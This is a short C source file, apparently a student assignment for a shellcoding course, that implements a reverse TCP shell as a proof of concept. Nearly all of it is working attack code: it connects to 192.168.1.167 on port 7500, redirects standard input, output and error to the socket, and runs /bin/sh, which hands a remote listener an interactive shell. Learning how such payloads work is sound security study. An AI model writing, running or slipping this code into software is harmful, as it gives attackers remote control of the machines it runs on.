//Description:	Assignment #2 (PoC of Reverse_Shell_Bind_TCP)
//Author: 		Paolo Stivanin <https://github.com/polslinux>
//SLAE ID:		526

#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define STDIN 0
#define STDOUT 1
#define STDERR 2

int main(void){
	int fd;
	struct sockaddr_in server_addr;
	char *argv[] = { "/bin/sh", NULL };

	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(7500);
	server_addr.sin_addr.s_addr = inet_addr("192.168.1.167");
	
	//socket
	fd = socket(AF_INET, SOCK_STREAM, 0);
	
	//connect
	connect(fd, (struct sockaddr *)&server_addr, 16);
	
	//dup2 (0,1,2) (client will be connected to stdin, stdout and stderr)
	dup2(fd, STDIN);
	dup2(fd, STDOUT);
	dup2(fd, STDERR);
	
	//execve /bin/sh
	execve(argv[0], &argv[0], NULL);
	
	return 0;
}
